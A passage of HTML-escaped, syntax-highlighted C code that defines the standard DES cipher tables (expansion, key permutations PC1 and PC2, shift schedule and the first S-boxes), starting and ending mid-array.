	&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;	
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; E_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; PC1_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; Move_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; PC2_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;	
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; S_Box[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
	&lt;span style=&#34;color:#75715e&#34;&gt;//S1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
	 &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,
	&lt;span style=&#34;color:#75715e&#34;&gt;//S3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
